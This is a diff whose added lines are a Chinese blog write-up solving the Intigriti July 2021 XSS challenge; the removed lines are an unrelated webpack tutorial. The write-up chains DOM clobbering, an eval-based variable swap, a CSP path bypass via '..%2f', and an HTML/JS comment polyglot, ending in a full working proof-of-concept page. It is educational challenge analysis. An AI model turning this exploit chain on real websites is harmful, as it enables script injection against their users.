@@ -1,507 +1,501 @@
+1. prefix: `"[logv]: "`
+2. data: `window[m.message]`
+3. type: `false`
+4. safe: `'info'`
+
+是靠順序而不是靠名稱，這也是許多新手會被搞混的地方。
+
+總之呢，就讓我們從 `log` 這個函式開始往回找吧，要執行到這一段，必須要 post message 到這個 window，然後符合一些條件。
+
+## 第一關：成功 post message
+
+這個 console.php 的頁面有一些條件限制，如果沒有符合這些條件就沒辦法執行到 log function 去。
+
+首先這個頁面必須被 embed 在 iframe 裡面：
+
+``` js
+name = 'Console'
+document.title = name;
+if (top === window){
+    document.head.parentNode.remove(); // hide code if not on iframe
+}
 ```
-module.exports = {
-  entry: './main.js',
-  output: {
-    path: __dirname,
-    filename: 'webpack_bundle.js'
+
+再來還有這些檢查要通過：
+
+``` js
+try {
+    if (!top.DEV)
+        throw new Error('Production build!');
+        
+    let checkCredentials = (username, password) => {
+        try{
+            let users = top.store.users;
+            let access = [users.admin, users.moderator, users.manager];
+            if (!users || !password) return false;
+            for (x of access) {
+                if (x.username === username && x.password === password)
+                    return true
+            }
+        } catch {
+            return false
+        }
+        return false
+    }
+
+    let _onmessage = onmessage;
+    onmessage = e => {
+        let m = e.data;
+        if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {
+            return; // do nothing if unauthorized
+        }
+        // ...
+    }
+} catch {
+    // hide this script on production
+    document.currentScript.remove();
+}
+```
+
+`top.DEV` 要是 truthy，然後傳進去的 credentials 要符合 `top.store.users.admin.username` 還有 `top.store.users.admin.password`
+
+這樣我應該自己寫一個頁面，然後設置一下這些全域變數就好了？
+
+沒辦法，因為有 Same Origin Policy 的存在，你只能存取同源頁面下的 window 內容，所以如果是自己寫一個頁面然後把 console.php embed 在裡面的話，在存取 `top.DEV` 時就會出錯。
+
+所以我們需要有一個同源的頁面可以讓我們設置一些東西。而這個頁面，顯然就是可以讓我們插入一些 HTML 的 htmledit.php 了。
+
+## DOM clobbering
+
+該怎麼在不能執行 JS 的情況下設置全域變數呢？沒錯，就是 DOM clobbering。
+
+舉例來說，如果你有個 `<div id="a"></div>`，在 JS 裡面你就可以用 `window.a` 或是 `a` 去存取到這個 div 的 DOM。
+
+如果你對 DOM clobbering 不熟的話可以參考我之前寫過的[淺談 DOM Clobbering 的原理及應用](https://blog.huli.tw/2021/01/23/dom-clobbering/)，或是這一篇也寫得很好：[使用 Dom Clobbering 扩展 XSS](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/)
+
+如果要達成多層的變數設置，就要利用到 `iframe` 搭配 `srcdoc`：
+
+``` html
+<a id="DEV"></a>
+<iframe name="store" srcdoc='
+    <a id="users"></a>
+    <a id="users" name="admin" href="ftp://a:a@a"></a>
+    '>
+</iframe>
+<iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+```
+
+這邊還有利用到一個特性是 a 元素的 username 屬性會是 href 屬性裡 URL 的 username。
+
+這樣設置的話，`top.DEV` 就會是 `a id="DEV"></a>` 這個 DOM，而 `store.users` 就會是 HTMLCollection，`store.users.admin` 是那個 a，`store.users.admin.username` 則會是 href 裡面的 username，也就是 `a`，而密碼也是一樣的。
+
+綜合以上所述，我可以自己寫一個 HTML 然後用 `window.open` 去開啟 htmledit.php 然後把上面的內容帶進去：
+
+``` html
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS POC</title>  
+</head>
+<body>
+  <script>
+    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+    const payload = `
+      <a id="DEV"></a>
+      <iframe name="store" srcdoc='
+        <a id="users"></a>
+        <a id="users" name="admin" href="ftp://a:a@a"></a>
+      '></iframe>
+      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+    `
+
+    var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+    // wait unitl window loaded
+    setTimeout(() => {
+      console.log('go')
+      const credentials = {
+        username: 'a',
+        password: 'a'
+      }
+      win.frames[1].postMessage({
+        cmd: 'test',
+        credentials
+      }, '*')
+    }, 5000)
+
+  </script>
+</body>
+</html>
+```
+
+如此一來，我就可以用 postMessage 送訊息進去了。
+
+雖然花了一番功夫，但這才只是開始而已。
+
+## 第二關：讓 safe 變成 true
+
+safe 要是 true，這樣呼叫 log 的時候才不會把 `<` escape，要讓 safe 是 true 的話，要找到有傳入四個參數的呼叫，因為第四個會是 safe 的值：
+
+``` js
+case "logv": { // display variable's value by its name
+    log("[logv]: ", window[m.message], safe=false, type='info'); 
+    break;
+}
+case "compare": { // compare variable's value to a given one
+    log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); 
+    break;
+}
+```
+
+`log("[logv]: ", window[m.message], safe=false, type='info')` 這個我在找的 function call，而這之中第二個參數會是 `window[m.message]`，也就是說可以把任一全域變數當作 data 傳進去，可是要傳什麼呢？
+
+## 第三關：找到可以傳入的變數
+
+我在這邊卡得滿久的，因為我想不太到這邊可以傳什麼。以前有一招是可以傳 name，但是這個網頁已經自己設定 name 了所以沒辦法。另一招是用 URL 去傳就可以把東西放在 location 上面，但 `log` 裡面會檢查 `data` 是不是字串，不是的話要先經過 `JSON.stringify`，會把內容encode。
+
+卡很久的我只好不斷重複看著程式碼，看能不能找出什麼新東西，結果還真的找到了。下面這段 code 有一個新手常見問題，你有看出來嗎？
+
+``` js
+let checkCredentials = (username, password) => {
+    try{
+        let users = top.store.users;
+        let access = [users.admin, users.moderator, users.manager];
+        if (!users || !password) return false;
+        for (x of access) {
+            if (x.username === username && x.password === password)
+                return true
+        }
+    } catch {
+        return false
+    }
+    return false
+}
+```
+
+這個問題就出在 `for (x of access) {`，x 忘了宣告，所以預設就會變成全域變數。在這邊的話，`x` 會是 `top.store.users.admin`，也就是我們自己設置的那個 `<a>`。
+
+## 第四關：繞過型態檢查
+
+既然我們有了這個 x，就可以把它用 logv 這個 command 傳入 log function，然後因為 safe 會是 true，所以就可以直接把 x 的內容用 innerHTML 顯示出來。
+
+如果你把一個 a 元素變成字串，會得到 a.href 的內容，所以我們可以把我們的 payload 放在 href 裡面。
+
+但是，`log` 裡面會檢查 data 的型態，而 `a` 不是字串所以過不了檢查，這該怎麼辦呢？
+
+這時候我重新看了一遍程式碼，發現了這個指令：
+
+``` js
+case "reassign": { // change variable's value
+    let o = m.message;
+    try {
+        let RegExp = /^[s-zA-Z-+0-9]+$/;
+        if (!RegExp.test(o.a) || !RegExp.test(o.b)) {
+            throw new Error('Invalid input given!');
+        }
+        eval(`${o.a}=${o.b}`);
+        log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
+    } catch (err) {
+        log("[reassign]: ", `Error changing value (${err.message})`, type='err');
+    }
+    break;
+}
+```
+
+我可以這樣做：
+
+``` js
+win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 'Z',
+      b: 'x+1'
+    },
+    credentials
+}, '*')
+```
+
+這就等於是 `Z=x+1`，然後 `x+1` 的時候會因為自動轉型的關係變成字串，這樣一來 Z 就會是一個含有我們 payload 的字串了。
+
+## 第五關：繞過 encode
+
+雖然我們現在可以傳字串進去了，但還有一件事情要搞定，那就是因為 href 裡面的東西是 URL 所以會被 encode，例如說 `<` 會變成 `%3C`：
+
+``` js
+var a = document.createElement('a')
+a.setAttribute('href', 'ftp://a:a@a#<img src=x onload=alert(1)>')
+console.log(a+1)
+// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1
+```
+
+這又要怎麼辦呢？
+
+在 `log` 裡面有一行是 `data = parse(data)`，而 parse 的程式碼是這樣的：
+
+``` js
+let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
+```
+
+如果 e 是字串，那就回傳 `s(e)`，而這個 s 是另外一個函式。
+
+當初在看程式碼的時候，我看到 reassign 那邊對於 eval 的檢查時，就注意到了它的規則：`RegExp = /^[s-zA-Z-+0-9]+$/;`，還有底下這四個函式：
+
+``` js
+let a = (s) => s.anchor(s);
+let s = (s) => s.normalize('NFC');
+let u = (s) => unescape(s);
+let t = (s) => s.toString(0x16);
+```
+
+其中 s, u 跟 t 這三個字元都是允許的，也就是說，可以透過 reassign 這個指令把他們互換！我們可以把 `s` 換成 `u`，這樣 data 就會被 unescape 了！
+
+所以最後的程式碼會長這樣：
+
+``` js
+const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+const insertPayload=`<img src=x onerror=alert(1)>`
+const payload = `
+  <a id="DEV"></a>
+  <iframe name="store" srcdoc='
+    <a id="users"></a>
+    <a id="users" name="admin" href="ftp://a:a@a#${escape(insertPayload)}"></a>
+  '></iframe>
+  <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+`
+
+var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+// 等待 window 載入完成
+setTimeout(() => {
+  console.log('go')
+  const credentials = {
+    username: 'a',
+    password: 'a'
   }
-}
+  // s=u
+  win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 's',
+      b: 'u'
+    },
+    credentials
+  }, '*')
+
+  // Z=x+1 so Z = x.href + 1
+  win.frames[1].postMessage({
+    cmd: 'reassign',
+    message:{
+      a: 'Z',
+      b: 'x+1'
+    },
+    credentials
+  }, '*')
+
+  // log window[Z]
+  win.frames[1].postMessage({
+    cmd: 'logv',
+    message: 'Z',
+    credentials
+  }, '*')
+}, 5000)
 ```
 
-仔細觀察就會發現這其實跟使用 browserify 時要設定的選項是一樣的，入口點以及輸出的檔案名稱以及路徑（__dirname 代表跟 config 檔同一個目錄）。
+所以 data 會是 `ftp://a:a@a#<img src=x onerror=alert(1)>`，然後被設定到 HTML 上面，觸發 XSS！
 
-接著在 terminal 上面執行這幾行指令，簡單來說就是先安裝 webpack 然後執行 webpack：
+不，事情沒那麼順利...我忘記有 CSP 了。
+
+## 第六關：繞過 CSP
+
+雖然我可以插入任意 HTML，但很遺憾地這個網頁也有 CSP：
 
 ```
-npm init -y
-npm install webpack webpack-cli --save-dev
-npx webpack --config webpack.config.js
+script-src 
+'nonce-xxx' 
+https://challenge-0721.intigriti.io/analytics/ 
+'unsafe-eval';
+
+frame-src https:;
+
+object-src 'none';base-uri 'none';
 ```
 
-![](/img/mods/webpack.png)
+因為沒有 `unsafe-inline`，所以我們之前的 payload 是無效的。而這一段 CSP 當中，`https://challenge-0721.intigriti.io/analytics/` 顯然是個很可疑的路徑。
 
-接著就會看到目錄下多了一個 `webpack_bundle.js`，內容也是完全看不懂的東西。這是因為 webpack 有兩個模式，production 與 development，預設是前者。production 代表在生產環境下使用，所以會自動幫你壓縮以及優化。
+這個頁面其實有引入一個 https://challenge-0721.intigriti.io/analytics/main.js 的檔案，但裡面沒有東西，只有一些註解而已。
 
-在開發的時候通常會使用 development 這個模式，打包的速度較快。更改的方式很簡單，改變設定檔即可：
+其實看到這邊的時候我就知道要怎麼做了，因為我之前有學到一個繞過 CSP 的技巧，利用`%2F`（編碼過後的 `/`）以及前後端對於 URL 解析的不一致。
 
-``` js
-module.exports = {
-  mode: 'development',
-  entry: './main.js',
-  output: {
-    path: __dirname,
-    filename: 'webpack_bundle.js'
-  }
-}
-```
+以 `https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php` 為例，對瀏覽器來說，這個 URL 是在 `/analytics` 底下，所以可以通過 CSP 的檢查。
 
-存檔以後再執行一次 `npx webpack --config webpack.config.js`，結果如下：
+但是對伺服器來說，這一段是 `https://challenge-0721.intigriti.io/analytics/../htmledit.php` 也就是 `https://challenge-0721.intigriti.io/htmledit.php`
 
-``` js
-/******/ (function(modules) { // webpackBootstrap
-/******/ 	// The module cache
-/******/ 	var installedModules = {};
-/******/
-/******/ 	// The require function
-/******/ 	function __webpack_require__(moduleId) {
-/******/
-/******/ 		// Check if module is in cache
-/******/ 		if(installedModules[moduleId]) {
-/******/ 			return installedModules[moduleId].exports;
-/******/ 		}
-/******/ 		// Create a new module (and put it into the cache)
-/******/ 		var module = installedModules[moduleId] = {
-/******/ 			i: moduleId,
-/******/ 			l: false,
-/******/ 			exports: {}
-/******/ 		};
-/******/
-/******/ 		// Execute the module function
-/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
-/******/
-/******/ 		// Flag the module as loaded
-/******/ 		module.l = true;
-/******/
-/******/ 		// Return the exports of the module
-/******/ 		return module.exports;
-/******/ 	}
-/******/
-/******/
-/******/ 	// expose the modules object (__webpack_modules__)
-/******/ 	__webpack_require__.m = modules;
-/******/
-/******/ 	// expose the module cache
-/******/ 	__webpack_require__.c = installedModules;
-/******/
-/******/ 	// define getter function for harmony exports
-/******/ 	__webpack_require__.d = function(exports, name, getter) {
-/******/ 		if(!__webpack_require__.o(exports, name)) {
-/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
-/******/ 		}
-/******/ 	};
-/******/
-/******/ 	// define __esModule on exports
-/******/ 	__webpack_require__.r = function(exports) {
-/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
-/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
-/******/ 		}
-/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
-/******/ 	};
-/******/
-/******/ 	// create a fake namespace object
-/******/ 	// mode & 1: value is a module id, require it
-/******/ 	// mode & 2: merge all properties of value into the ns
-/******/ 	// mode & 4: return value when already ns object
-/******/ 	// mode & 8|1: behave like require
-/******/ 	__webpack_require__.t = function(value, mode) {
-/******/ 		if(mode & 1) value = __webpack_require__(value);
-/******/ 		if(mode & 8) return value;
-/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
-/******/ 		var ns = Object.create(null);
-/******/ 		__webpack_require__.r(ns);
-/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
-/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
-/******/ 		return ns;
-/******/ 	};
-/******/
-/******/ 	// getDefaultExport function for compatibility with non-harmony modules
-/******/ 	__webpack_require__.n = function(module) {
-/******/ 		var getter = module && module.__esModule ?
-/******/ 			function getDefault() { return module['default']; } :
-/******/ 			function getModuleExports() { return module; };
-/******/ 		__webpack_require__.d(getter, 'a', getter);
-/******/ 		return getter;
-/******/ 	};
-/******/
-/******/ 	// Object.prototype.hasOwnProperty.call
-/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
-/******/
-/******/ 	// __webpack_public_path__
-/******/ 	__webpack_require__.p = "";
-/******/
-/******/
-/******/ 	// Load entry module and return exports
-/******/ 	return __webpack_require__(__webpack_require__.s = "./main.js");
-/******/ })
-/************************************************************************/
-/******/ ({
+所以我們成功繞過了 CSP，載入不同路徑的檔案！
 
-/***/ "./main.js":
-/*!*****************!*\
-  !*** ./main.js ***!
-  \*****************/
-/*! no static exports found */
-/***/ (function(module, exports, __webpack_require__) {
+因此現在的目標就變成我們要找一個檔案裡面可以讓我們放 JS 程式碼。看來看去都只有 htmledit.php 能用，但它不是一個 HTML 嗎？
 
-eval("var obj = __webpack_require__(/*! ./utils */ \"./utils.js\")\nconsole.log(obj.cal(30)) // 9\nconsole.log(obj.name) // hello\n\n\n//# sourceURL=webpack:///./main.js?");
+## 第七關：構造 JS 程式碼
 
-/***/ }),
-
-/***/ "./utils.js":
-/*!******************!*\
-  !*** ./utils.js ***!
-  \******************/
-/*! no static exports found */
-/***/ (function(module, exports) {
-
-eval("function calculate(n) { \n  return ((n * 100 + 20 - 4)) % 10 + 3  // 計算價格公式\n}\n  \nmodule.exports = {\n  cal: calculate,\n  name: 'hello'\n} // 把這個物件 export 出去\n\n//# sourceURL=webpack:///./utils.js?");
-
-/***/ })
-
-/******/ });
-```
-
-跟 browserify 一樣，你把上面這整串貼到瀏覽器的 console 去，一樣可以正常執行並輸出結果。上面的程式碼不用細看，大致上滑過去就好，但你滑過去的時候就會發現有許多東西跟 browserify 打包出來的程式碼類似。
-
-好，看到這邊相信大家已經知道了兩個重點：
-
-1. webpack 與 browserify 類似
-2. 要在瀏覽器上面使用 CommonJS 的模組機制，就必須使用工具先把程式碼打包才能做到
-
-而第二點就是必須使用 webpack 的理由。
-
-這時你可能會想問一個問題：
-
-> 可是我們公司沒有用 require，而是用 ES6 的 import 與 export，這個瀏覽器不是支援了嗎？那為什麼需要 webpack？
-
-問得很好，看到這邊可以先起身喝個水，下半場要開始了。
-
-## ES6 的標準化模組
-
-前面有提到在 ES6 出現以前，JavaScript 並沒有一個標準的模組化規範。Node.js 支援 CommonJS，所以才可以用`require`跟`module.exports`，但是瀏覽器原生沒有支援，所以才需要像是 browserify 以及 webpack 這種工具。
-
-而 ES6 出來之後，終於有了正式的規範，就是大家常看到的 import 與 export，我們可以把之前的 main.js 與 utils.js 改成 import 與 export 的形式：
-
-``` js
-// main.js
-import obj from './utils'
-console.log(obj.cal(30))
-console.log(obj.name)
-
-//utils.js
-function calculate(n) { 
-  return ((n * 100 + 20 - 4)) % 10 + 3  // 計算價格公式
-}
-  
-export default {
-  cal: calculate,
-  name: 'hello'
-}
-```
-
-雖然說這是 ES6 的標準，但其實支援度還不是很好。
-
-若是你在 Node.js 上面試圖執行 `node main.js`，會直接噴給你一個 `SyntaxError: Unexpected identifier` 的錯誤，因為 Node.js 不認識 `import` 這個語法。
-
-想要在 Node.js 上面使用 import 與 export 的話有兩個方法，第一個方法是把副檔名從 .js 換成 .mjs，然後在使用 node 時加上一個 flag：`node --experimental-modules main.mjs`。
-
-![](/img/mods/es.png)
-
-順帶一提，這是 Node.js 版本 < 13 時的狀況，如果是最新的 13 版本以上，只要把檔名改成 mjs 就好，詳情可以參考：[Node.js v13.7.0 Documentation: ECMAScript Modules](https://nodejs.org/dist/latest-v13.x/docs/api/esm.html#esm_enabling)。
-
-第二個方法就是大名鼎鼎的 babel 啦，靠著 babel 幫我們把 ES6 的語法轉成 ES5，可以直接使用在 babel 官網上提供的[簡易線上轉換器](https://babeljs.io/repl#?browsers=&build=&builtIns=false&spec=false&loose=false&code_lz=JYWwDg9gTgLgBBARgKzgMyhEcDkA6AegFcZgAbAZxwCgBjCAOwojIFM8yIBzACiWTy0AhmR4BmAAwBKKXUbM2HbnxR4GQkK1lA&debug=false&forceAllTransforms=false&shippedProposals=false&circleciRepo=&evaluate=true&fileSize=false&timeTravel=false&sourceType=module&lineWrap=false&presets=es2015%2Creact%2Cstage-2&prettier=false&targets=&version=7.8.3&externalPlugins=)，把 `main.js` 的內容從 import 轉成 require：
-
-![](/img/mods/babel.png)
-
-上面講的都是 Node.js 的使用，那瀏覽器呢？
-
-可以先來試試看什麼都不要改變，一樣只有 `main.js` 與 `utils.js`，然後新增一個 index.html，內容如下：
+如果你還記得的話，這個頁面的開頭有一段是 HTML 的註解：
 
 ``` html
-<html>
-<head>
-  <script src="./main.js"></script>
-</head>
-<body>
-</body>
-</html>
+<!-- &lt;img src=x&gt; -->
+....
 ```
 
-打開之後會看到 devtool 的 console 吐了這樣一個錯誤：
+而在一些情況下，其實這語法也是 JS 的註解。不是我說的，是規格書說的：
 
-`Uncaught SyntaxError: Cannot use import statement outside a module`
+![ECMAScript spec](/img/others/xss-july.jpg)
 
-跟 Node.js 類似，若是想要使用 import 與 export，都必須以 module 的形式來執行，所以要在 script 標籤加上 type：
+換句話說呢，我們可以利用這點，做出一個看起來像 HTML，但實際上也是合法 JS 的檔案！
+
+我最後做出來的 URL 是這樣：`https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*`
+
+產生的 HTML 長這樣：
 
 ``` html
-<html>
+<!-- 1; 這邊都是註解
+top.alert(document.domain);/* --> 這之後也都是註解了
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <script src="./main.js" type="module"></script>
+...
+```
+
+第一行是註解，`/*` 之後也都是註解，所以這一整段其實就是 `top.alert(document.domain);` 的意思。
+
+不過這邊可以注意的是 htmledit.php 的 content type 不會變，依然還是 `text/html`，之所以可以把它當作 JS 引入，是因為同源的關係。如果你是把一個不同源的 HTML 當作 JS 引入，就會被 [CORB](https://www.chromium.org/Home/chromium-security/corb-for-developers) 給擋下來。
+
+做到這邊，我們就可以讓 data 是 `<script src="https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*"></script>`
+
+這樣就會執行到 `text_tag.innerHTML = data`，成功在頁面上放進去 script 還繞過了 CSP，完美！
+
+但可惜的是，還差一點點...
+
+## 第八關：執行動態插入的 script
+
+就在我以為要過關的時候，卻發現我的 script 怎樣都不會執行。後來用[關鍵字](https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml)去查，才發現如果是用 innerHTML 插入 script 標籤，插入之後是不會去執行的。
+
+我試著用 `innerhtml import script` 或是 `innerhtml script run` 之類的關鍵字去找解法但都沒找到。
+
+最後，我是突然想到可以試試看 `<iframe srcdoc="...">`，有種死馬當活馬醫的感覺，反正就試試看這樣行不行，沒有損失。
+
+結果沒想到就可以了。直接 assign 給 innerHTML 不行，但如果內容是：`<iframe srcdoc="<script src='...'></script>"` 就可以，就會直接載入 script。
+
+## 最後解法
+
+最後再補充一件事情，我要送出答案之前發現我的答案在 Firefox 上面不能跑，原因是這段程式碼：
+
+``` html
+<a id="users"></a>
+<a id="users" name="admin" href="a"></a>
+```
+
+在 Chrome 上 `window.users` 會是 HTMLCollection，但在 Firefox 上面只會拿到一個 a 元素，而 `window.users.admin` 也就是 undefined。
+
+但這問題不大，只要多一層 iframe 就可以搞定：
+
+``` html
+<iframe name="store" srcdoc="
+  <iframe srcdoc='<a id=admin href=ftp://a:a@a#></a>' name=users>
+">
+</iframe>
+```
+
+我最後的答案長這樣：
+
+``` html
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XSS POC</title>  
 </head>
+
 <body>
+  <script>
+    const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code='
+    const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'
+    const insertPayload=`<iframe srcdoc="<script src=${exploitSrc}><\/script>">`
+    const payload = `
+      <a id="DEV"></a>
+      <iframe name="store" srcdoc="
+        <iframe srcdoc='<a id=admin href=ftp://a:a@a#${escape(insertPayload)}></a>' name=users>
+      ">
+      </iframe>
+      <iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php"></iframe>
+    `
+    var win = window.open(htmlUrl + encodeURIComponent(payload))
+
+    // wait for 3s to let window loaded
+    setTimeout(() => {
+      const credentials = {
+        username: 'a',
+        password: 'a'
+      }
+      win.frames[1].postMessage({
+        cmd: 'reassign',
+        message:{
+          a: 's',
+          b: 'u'
+        },
+        credentials
+      }, '*')
+
+      win.frames[1].postMessage({
+        cmd: 'reassign',
+        message:{
+          a: 'Z',
+          b: 'x+1'
+        },
+        credentials
+      }, '*')
+
+      win.frames[1].postMessage({
+        cmd: 'logv',
+        message: 'Z',
+        credentials
+      }, '*')
+    }, 3000)
+
+  </script>
 </body>
 </html>
-```
-
-接著再次打開頁面，會發現還是有一個錯誤：
 
 ```
-Access to script at 'file:///Users/huli/w_test/main.js' from origin 'null'
-has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes:
-http, data, chrome, chrome-extension, https.
-```
 
-因為我目前打開 index.html 是直接點兩下打開，所以其實是開檔案而已，網址開頭會是 `file:///`。若是要使用 import 的話，必須要用伺服器的方式開啟才行。可以在同一個目錄底下輸入這行指令，簡單跑一個 file server：
+## 其他解法
 
-```
-python -m SimpleHTTPServer 8080
-```
+我的方法是新開一個 window 來 post message，但其實也可以把自己作為 iframe，讓 htmledit.php embed，這樣的話其實也可以用 top.postMessage 去傳送訊息。
 
-接著就可以打開：http://localhost:8080。
+「把自己 embed 在其他網頁中」這個是我很常忘記的一個方法。
 
-很不巧地，這次又出現了一個錯誤：`GET http://localhost:8080/utils net::ERR_ABORTED 404 (File not found)`
-
-要把 main.js 裡的 `import obj from './utils'` 改成：`import obj from './utils.js'` 才行，要明確指定是要引入 .js 這個檔案。
-
-改完之後重新整理，就可以在 console 上面看到正確的結果了！底下是完整的程式碼，只有三個檔案而已：
-
-main.js
+另一個非預期的解法也很神奇，是根據這一段：
 
 ``` js
-import obj from './utils.js'
-console.log(obj.cal(30))
-console.log(obj.name)
-```
-
-utils.js
-
-``` js
-function calculate(n) { 
-  return ((n * 100 + 20 - 4)) % 10 + 3  // 計算價格公式
+case "log": {
+  log("[log]: ", e.data.message.text, type=e.data.message.type);
+  break;
 }
-  
-export default {
-  cal: calculate,
-  name: 'hello'
-}
 ```
 
-index.html
+這一段的重點是 `type=e.data.message.type`，會設置一個 global variable 叫做 type，因此其實可以透過這邊傳入任意 payload，再去呼叫 logv 就好。就省去了把 payload 放在 a 上面那一大堆要處理的事情。
 
-``` js
-<html>
-<head>
-  <script src="./main.js" type="module"></script>
-</head>
-<body>
-</body>
-</html>
-```
+## 總結
 
-到這裡為止一切看似順利，好像沒什麼問題。在網頁上只要把引入的標籤多一個 `type="module"` 就可以跑起來了，很棒啊。
+我滿喜歡這次的這個題目，因為有種層層關卡的感覺，一關一關慢慢過，每當我以為要破關的時候，就又卡住了，直到最後才把所有關卡都解完，成功執行 XSS。
 
-事情是沒有那麼簡單的。
+從這個挑戰中，可以學習到的前端知識是：
 
-第一個問題，瀏覽器支援度。
+1. DOM clobbering
+2. JS 的註解不是只有 // 跟 /* */
+3. CSP 針對 path 的繞過
+4. 用 innerHTML 新增的 script 不會執行
+5. 針對上一點，可以用 iframe srcdoc 來繞過（但一般狀況下應該新增一個 script tag 然後 append）
 
-其實這個問題說大不大說小不小，端看貴公司有沒有要支援 IE，因為各大瀏覽器都有支援 import 與 export，可是 IE 沒有。
+從這個題目中可以學習或是複習滿多技巧的，CTF 跟這種挑戰有趣的點就在這邊，雖然說每樣東西拆開來可能都知道，但要怎麼精心串起來，是很考驗經驗跟功力的。
 
-第二個問題，我想要使用 npm 上面其他人寫的套件的話怎麼辦？
-
-在 Node.js 裡面沒有這個問題，因為你一定會在資料夾底下先裝好 `node_modules`，可是網頁呢？難道要把整個 `node_modules` 資料夾一起傳上去嗎？
-
-還有一個問題是當你在 import 的時候，路徑要怎麼寫？難道要寫明是：`import pad from './node_modules/pad-left/index.js'` 這樣嗎？這是可維護性相當差的一個寫法，若是模組的入口點變了，你就必須改寫所有 import 的地方。
-
-這個問題其實是相當麻煩的，因為在開發時通常都會用到其他人寫好的模組，若是沒辦法很方便地去支援引入這些模組，會造成很多不便利。
-
-還記得我前面說過的話嗎？
-
-「前端的世界很簡單，不支援的東西，寫工具自己支援就好了。」，這邊要稍微修改一下，變成：「前端的世界很簡單，不支援或是支援度很差的東西，寫工具自己支援就好了」。
-
-就是因為瀏覽器原生的模組機制會碰到許多問題（相容性、無法兼容 npm 等等），所以我們才需要一個額外的工具。
-
-而這個工具，就是 webpack。
-
-## 再探 webpack
-
-為了來體驗 webpack 的強大之處，我們先隨便找一個套件來安裝：
-
-```
-npm install pad-left
-```
-
-接著在 main.js 裡面引入套件並且使用：
-
-``` js
-import obj from './utils.js'
-import pad from 'pad-left'
-console.log(obj.cal(30))
-console.log(pad('4', 4, 0))
-```
-
-然後一樣按照之前教過的流程打包檔案，config 檔之前已經寫過了，所以直接下指令就好：
-
-```
-npx webpack --config webpack.config.js
-```
-
-接著打開 index.html，更改引入的 script，因為有 webpack 的關係所以不需要 `type=module` 了：
-
-``` html
-<html>
-<head>
-  <script src="./webpack_bundle.js"></script>
-</head>
-<body>
-</body>
-</html>
-```
-
-最後打開 index.html，看到 console 上面出現 9 跟 0004 這兩個輸出，就代表有打包成功了。
-
-所以使用 webpack 的好處之一，就是我們能把使用 npm 安裝的模組一併打包，就跟打包自己寫的模組一樣，不需要多做其他事情。這件事是原生的瀏覽器沒辦法做到的。
-
-我們之所以需要 webpack，就是因為原生的瀏覽器模組功能跟支援度都沒那麼完整。
-
-不過呢，其實 webpack 的強大之處不只這樣而已。打開 [webpack 官網](https://webpack.js.org/)，會看到這張圖：
-
-![](/img/mods/web.png)
-
-webpack 最厲害的地方在於它把「模組化」這個概念延伸了。我們剛剛在談論模組化的時候，都只有討論 JavaScript，討論程式上的模組。但 webpack 把「任何資源」都視成一個模組。
-
-圖片是模組，所以你可以 `import Image from './assets/banner.png'`；CSS 是模組，你可以 `import styles from 'style.css'`，只要是任何資源都可以 import 進來使用。
-
-這已經跟 JavaScript 與 ES6 一點關係都沒有了，這完全是 webpack 自己的延伸，在瀏覽器上面你是沒有辦法這樣使用的。
-
-為了要支援這樣的功能，webpack 定義了許多 loader（載入器），不同的資源有不同的 loader，要透過 loader 處理才能把資源載入。而這個 loader 也是它強大的地方。
-
-例如說你可以用 scss loader 載入 scss 的檔案，在引入資源的時候就會幫你順便編譯成 CSS，所以你不用自己做這件事。JS 也是一樣，你可以寫最新最潮的語法，然後在載入時用 babel-loader 把 ES10 的語法轉成 ES5。
-
-這種資源的引入以及轉換，才是 webpack 最強大的地方。
-
-還記得你在寫 React 的時候，把 import 圖片跟 CSS 當作吃飯喝水一樣嗎？好像這樣是很稀鬆平常的事。
-
-你能夠寫出這種語法而且被支援，都是因為底層有 webpack 在幫你做處理，都是因為有 image loader 跟 css loader 特別處理你的 import。這不是瀏覽器原生就支援的東西，而是 webpack 的模組系統幫你做的事。
-
-再者，掌握了資源的打包這一段之後，webpack 就可以藉由 loader 以及 plugin 做更多有趣的事，例如說：
-
-1. 在載入 JS 的時候順便做 uglify
-2. 在載入 CSS 的時候順便做 minify
-3. 把打包出來的檔名順便加上 hash
-4. 根據不同頁面打包不同的檔案，就不用一次載入全部 JS
-5. 支援動態引入 JS，有需要的時候才載入
-
